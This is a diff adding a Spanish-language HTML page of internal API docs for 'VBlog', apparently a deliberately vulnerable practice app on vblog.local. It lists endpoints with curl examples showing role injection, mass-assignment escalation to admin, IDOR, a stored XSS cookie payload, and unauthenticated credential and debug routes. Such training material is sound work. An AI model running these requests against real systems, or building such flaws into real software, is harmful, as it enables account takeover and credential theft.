@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>VBlog — API Docs</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #0f172a; color: #cbd5e1; font-family: monospace; padding: 2rem; }
+        h1 { color: #f8fafc; font-size: 1.4rem; margin-bottom: 0.25rem; }
+        .subtitle { color: #64748b; font-size: 0.85rem; margin-bottom: 2rem; }
+        nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        nav a { background: #1e293b; border: 1px solid #334155; color: #7dd3fc; text-decoration: none; padding: 0.5rem 1rem; border-radius: 6px; font-size: 0.875rem; }
+        nav a:hover { background: #334155; }
+        .endpoint { background: #1e293b; border: 1px solid #334155; border-radius: 8px; margin-bottom: 1rem; overflow: hidden; }
+        .endpoint-header { display: flex; align-items: center; gap: 1rem; padding: 0.75rem 1rem; }
+        .endpoint-body { border-top: 1px solid #334155; padding: 1rem; font-size: 0.82rem; color: #94a3b8; }
+        .endpoint-body pre { background: #020617; border-radius: 6px; padding: 0.75rem; margin-top: 0.5rem; color: #e2e8f0; font-size: 0.78rem; overflow-x: auto; }
+        .tag { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; min-width: 52px; text-align: center; }
+        .tag.get    { background: #166534; color: #86efac; }
+        .tag.post   { background: #1d4ed8; color: #bfdbfe; }
+        .tag.put    { background: #92400e; color: #fde68a; }
+        .tag.delete { background: #7f1d1d; color: #fecaca; }
+        .route { color: #f1f5f9; font-size: 0.9rem; }
+        .auth-badge { font-size: 0.7rem; padding: 1px 7px; border-radius: 9999px; margin-left: auto; }
+        .auth-no  { background: #7f1d1d; color: #fecaca; }
+        .auth-yes { background: #14532d; color: #bbf7d0; }
+        .note { background: #422006; border-left: 3px solid #f97316; padding: 0.5rem 0.75rem; margin-top: 0.5rem; border-radius: 0 4px 4px 0; color: #fed7aa; font-size: 0.8rem; }
+        h2 { color: #94a3b8; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; margin: 1.5rem 0 0.75rem; }
+    </style>
+</head>
+<body>
+
+<h1>VBlog — Internal API Documentation</h1>
+<p class="subtitle">Base URL: http://vblog.local/api — Versión interna para desarrollo</p>
+
+<nav>
+    <a href="index.html">Panel</a>
+    <a href="api-docs.html">API Docs</a>
+    <a href="logs.html">App Logs</a>
+</nav>
+
+<h2>Auth</h2>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag post">POST</span>
+        <span class="route">/api/signup</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">
+        Crear cuenta nueva. Acepta: name, email, passkey.
+        <div class="note">⚠ No valida el campo <code>role</code> — si se envía, se guarda tal cual.</div>
+        <pre>curl -X POST http://vblog.local/api/signup \
+  -H "Content-Type: application/json" \
+  -d '{"name":"test","email":"test@x.com","passkey":"1234","role":"admin"}'</pre>
+    </div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag post">POST</span>
+        <span class="route">/api/login</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">
+        Login. Devuelve cookie de sesión. Campos: email, passkey.
+        <pre>curl -c cookies.txt -X POST http://vblog.local/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"editor01@vblog.local","passkey":"editor01pass"}'</pre>
+    </div>
+</div>
+
+<h2>Usuarios</h2>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/api/users</span>
+        <span class="auth-badge auth-yes">Auth requerida</span>
+    </div>
+    <div class="endpoint-body">
+        Devuelve todos los usuarios. Cualquier usuario autenticado puede acceder (sin verificar rol).
+        <div class="note">⚠ Broken Access Control — debería requerir rol admin.</div>
+    </div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/api/users/{id}</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">
+        Ver cualquier usuario por ID sin autenticación. IDOR + Information Disclosure.
+        <pre>curl http://vblog.local/api/users/52</pre>
+    </div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag put">PUT</span>
+        <span class="route">/api/update/user/{id}</span>
+        <span class="auth-badge auth-yes">Auth requerida</span>
+    </div>
+    <div class="endpoint-body">
+        Actualizar datos de usuario. Usa <code>$user->update($request->all())</code> sin filtrar campos.
+        <div class="note">⚠ Mass Assignment — el campo <code>role</code> está en <code>$fillable</code> y no hay validación de propiedad. Cualquier usuario autenticado puede escalar su propio rol.</div>
+        <pre># Escalar a editor
+curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
+  -H "Content-Type: application/json" \
+  -d '{"role":"editor"}'
+
+# Escalar a admin
+curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin"}'</pre>
+    </div>
+</div>
+
+<h2>Posts</h2>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/api/posts</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">Listar todos los posts paginados.</div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/api/posts/{id}</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">
+        Ver post por ID. No valida si el post pertenece al usuario — IDOR.
+        <pre>curl http://vblog.local/api/posts/5</pre>
+    </div>
+</div>
+
+<h2>Comentarios</h2>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag post">POST</span>
+        <span class="route">/api/create/comment</span>
+        <span class="auth-badge auth-yes">Auth requerida</span>
+    </div>
+    <div class="endpoint-body">
+        Crear comentario. El campo <code>content</code> se almacena sin sanitizar y se renderiza con <code>{!! !!}</code> en la vista.
+        <div class="note">⚠ Stored XSS — inyectar HTML/JS en content. Se ejecuta para cualquier usuario que lea el post.</div>
+        <pre>curl -b cookies.txt -X POST http://vblog.local/api/create/comment \
+  -H "Content-Type: application/json" \
+  -d '{"post_id":1,"content":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"}'</pre>
+    </div>
+</div>
+
+<h2>Rutas ocultas (no enlazadas)</h2>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/backup</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">
+        Devuelve credenciales en texto plano. 200 OK.
+        <div class="note">⚠ Pendiente de proteger antes del próximo release.</div>
+    </div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/debug</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">Info de la app en JSON: versión, PHP, driver de BD, conteos.</div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/internal</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">Devuelve 403 Forbidden.</div>
+</div>
+
+<div class="endpoint">
+    <div class="endpoint-header">
+        <span class="tag get">GET</span>
+        <span class="route">/old</span>
+        <span class="auth-badge auth-no">Sin auth</span>
+    </div>
+    <div class="endpoint-body">Redirige a / con 302.</div>
+</div>
+
+</body>
+</html>
